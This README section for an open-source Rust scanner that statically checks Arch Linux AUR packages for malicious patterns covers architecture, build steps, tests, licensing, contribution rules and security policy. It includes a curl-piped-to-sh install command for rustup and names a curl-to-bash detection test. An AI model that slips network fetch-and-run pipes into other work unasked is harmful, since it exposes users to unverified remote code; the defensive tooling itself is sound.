
## Project Architecture

```
ks-aur-scanner/
├── Cargo.toml                    # Workspace manifest
├── crates/
│   ├── aur-scanner-core/         # Core analysis engine (library)
│   │   ├── src/
│   │   │   ├── lib.rs            # Public API
│   │   │   ├── types.rs          # Core types (Severity, Finding, etc.)
│   │   │   ├── error.rs          # Error types
│   │   │   ├── parser/           # PKGBUILD parsing
│   │   │   ├── rules/            # Rule engine and built-in rules
│   │   │   ├── analyzer/         # Security analyzers
│   │   │   ├── aur.rs            # AUR RPC client
│   │   │   └── cache/            # Result caching
│   │   └── Cargo.toml
│   ├── aur-scanner-cli/          # CLI binary (aur-scan)
│   │   ├── src/
│   │   │   ├── main.rs           # Entry point
│   │   │   └── commands/         # Subcommands
│   │   └── Cargo.toml
│   ├── aur-scanner-hook/         # Pacman hook binary
│   │   ├── src/main.rs
│   │   └── Cargo.toml
│   └── aur-scanner-plugin/       # AUR helper wrapper
│       ├── src/
│       │   ├── lib.rs            # Plugin library
│       │   └── bin/wrapper.rs    # Wrapper binary
│       └── Cargo.toml
├── install/                      # Installation files
│   ├── integration.bash
│   ├── integration.zsh
│   ├── integration.fish
│   └── aur-scan.hook
├── tests/                        # Integration tests
└── PKGBUILD                      # AUR package definition
```

---

## Dependencies

### Build Dependencies

| Crate | Version | Purpose |
|-------|---------|---------|
| `tokio` | 1.40 | Async runtime |
| `async-trait` | 0.1 | Async trait support |
| `futures` | 0.3 | Future combinators |
| `regex` | 1.11 | Pattern matching |
| `lazy_static` | 1.5 | Compile-time regex |
| `serde` | 1.0 | Serialization |
| `serde_json` | 1.0 | JSON support |
| `toml` | 0.8 | Configuration parsing |
| `thiserror` | 1.0 | Error handling |
| `anyhow` | 1.0 | Error context |
| `tracing` | 0.1 | Logging |
| `tracing-subscriber` | 0.3 | Log formatting |
| `clap` | 4.5 | CLI argument parsing |
| `reqwest` | 0.12 | HTTP client (rustls) |
| `chrono` | 0.4 | Date/time handling |
| `colored` | 2.1 | Terminal colors |
| `blake3` | 1.5 | Fast hashing |
| `sha2` | 0.10 | SHA-256 checksums |
| `base64` | 0.22 | Base64 encoding |

### Runtime Dependencies

None. The release binary is statically linked.

### System Requirements

- Arch Linux (or Arch-based distribution)
- Rust 1.70+ (for building)
- `pacman` (for system audit feature)

---

## Building from Source

### Prerequisites

```bash
# Install Rust via rustup
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Ensure cargo is in PATH
source ~/.cargo/env
```

### Build

```bash
# Clone repository
git clone https://github.com/KiefStudioMA/ks-aur-scanner.git
cd ks-aur-scanner

# Build release version (optimized)
cargo build --release

# Binaries are in target/release/
ls -la target/release/aur-scan*
```

### Build Options

```bash
# Debug build (faster compilation, slower runtime)
cargo build

# Release build with full optimizations
cargo build --release

# Check for errors without building
cargo check

# Build with all warnings as errors
RUSTFLAGS="-D warnings" cargo build
```

---

## Testing

```bash
# Run all tests
cargo test

# Run tests with output
cargo test -- --nocapture

# Run specific test
cargo test test_detect_curl_bash

# Run clippy lints
cargo clippy

# Check formatting
cargo fmt --check
```

### Test Coverage

The test suite includes:
- Unit tests for parser, rule matching, and analyzers
- Integration tests with fixture PKGBUILDs
- Malicious pattern detection tests
- False positive prevention tests
- AUR API client tests

---

## License

This software is licensed under the **GNU General Public License v3.0 or later** (GPL-3.0-or-later).

You are free to use, modify, and distribute this software under the terms of the GPL-3.0. See the [LICENSE](LICENSE) file for the complete license text.

### Commercial Use and Attribution

Commercial use is permitted under the GPL-3.0 license. However, commercial users are kindly requested to:

- Provide attribution to **Kief Studio** with a do-follow link to [https://kief.studio](https://kief.studio)
- Consider supporting continued development of this project

This attribution request is not a legal requirement but is appreciated and helps sustain open source security tooling for the Arch community.

### Commercial Support

For commercial support, custom development, or enterprise licensing inquiries:

- **Website:** [https://kief.studio](https://kief.studio)
- **Email:** packages@kief.studio

---

## Contributing

This is a security tool a lot of people now rely on, and it shouldn't depend on
one person. **Contributors are genuinely welcome** — the whole point of the
auditable [detection catalog](#detection-rules-reference) and the community
[`rules.d/`](#custom--community-rules) format is so anyone can extend it without
touching the core.

Good places to start (look for [`good first issue`](https://github.com/KiefStudioMA/ks-aur-scanner/labels/good%20first%20issue)):

- **Detection rules** — patterns for emerging threats, as a community TOML rule or a built-in
- **False-positive fixes** — tighten a pattern that cries wolf (like the `chmod 755` one we fixed in 1.0.2)
- **AUR-helper integrations** — more shells/helpers (fish was added by a contributor in 1.0.3)
- **Docs, tests, fixtures**

**Read [CONTRIBUTING.md](CONTRIBUTING.md) first** — it spells out the bar. The
short version, because this is a security tool and the bar does not move:

- **Static-only is a hard invariant.** The scanner must *never* execute, source, or fetch-and-run a package it inspects. PRs that breach this are rejected on principle.
- **Every detection code lives in the auditable catalog** and is covered by the uniqueness/coverage tests — no orphan rules.
- **Tests + `cargo clippy` (no warnings) + `cargo fmt` are required.** New behavior needs new tests.
- **No change may weaken an existing security check** to make something simpler or faster.
- **`main` requires signed, reviewed commits** (enforced by a branch ruleset). Every change is reviewed before it lands; merges are GPG-signed. See CONTRIBUTING.md for how that works with your fork.

---

## Security

See **[SECURITY.md](SECURITY.md)** for the full policy and threat model.

### Reporting vulnerabilities

Report privately — **do not** open a public issue:

- **Email:** security@kief.studio (or use GitHub's *Report a vulnerability* button)

### How this project protects itself

A security tool has to be trustworthy end-to-end, so the supply chain around it
is hardened too:

- **The scanner is static-only** — it reads PKGBUILDs and install scripts; it never executes, sources, or fetches-and-runs the package it inspects. The scan cannot compromise the machine doing the scanning.
- **Releases are GPG-signed.** Tags are signed, and the tagged AUR packages verify the signature (`validpgpkeys`) instead of trusting a tarball hash. Verify with `git verify-tag v<version>`.
- **`main` and release tags are protected** by a branch ruleset: signed commits required, no force-push, no deletion. Every change is reviewed.
- **One auditable catalog.** Every detection code is indexed and uniqueness-tested, so what the tool *can* flag is always reviewable (`aur-scan codes`).

### Limits (be honest about them)

- Static analysis cannot catch every novel or heavily-obfuscated attack
- Sandboxed dynamic analysis is out of scope by design (that's what keeps it safe to run)
- For critical systems, still review PKGBUILDs yourself — this is defense-in-depth, not a guarantee

---

## Credits

**Developed by [Kief Studio](https://kief.studio)**

This project was created to address a critical gap in the Arch Linux security ecosystem. Special thanks to the security researchers who documented the attacks that informed our detection rules.

### Contributors

Built by the community, not just us. Thank you:

- [**@Disklo** (Rafael Lucio)](https://github.com/Disklo) — fixed a false-negative in `aur-scan check` and added the fish shell integration (1.0.3)
- [**@SuitablyMysterious**](https://github.com/SuitablyMysterious) — contributed the VirusTotal hash-lookup reference implementation (`vt_lookup`, [PR #9](https://github.com/KiefStudioMA/ks-aur-scanner/pull/9)) that the opt-in threat-intelligence integration is built on (1.2.0-rc1)

Sent a PR? Add yourself here. See the full list on the [contributors page](https://github.com/KiefStudioMA/ks-aur-scanner/graphs/contributors).

### References

- Arch Linux Security Advisory regarding 2018 AUR malware
- CHAOS RAT analysis (July 2025)
- CWE (Common Weakness Enumeration) database
- OWASP guidelines for code injection prevention

---

## Disclaimer

This tool provides an additional layer of security but **does not guarantee complete protection**.

- Static analysis cannot detect all forms of malicious behavior
- Obfuscated or novel attack patterns may evade detection
- False positives may occur; always verify findings
- This tool supplements but does not replace manual PKGBUILD review

The AUR is an inherently trust-based system where users are expected to verify package contents before installation. This scanner is a defense-in-depth measure, not a security guarantee.

**Use at your own risk. The authors are not responsible for any damage caused by malicious packages, whether detected or not.**

---

## Links

- **AUR Package:** [aur-scanner-git](https://aur.archlinux.org/packages/aur-scanner-git)
- **Repository:** [https://github.com/KiefStudioMA/ks-aur-scanner](https://github.com/KiefStudioMA/ks-aur-scanner)
- **Crates.io:** [aur-scanner-core](https://crates.io/crates/aur-scanner-core)
- **Homepage:** [https://kief.studio](https://kief.studio)
- **Issues:** [https://github.com/KiefStudioMA/ks-aur-scanner/issues](https://github.com/KiefStudioMA/ks-aur-scanner/issues)
- **License:** [GPL-3.0-or-later](LICENSE)
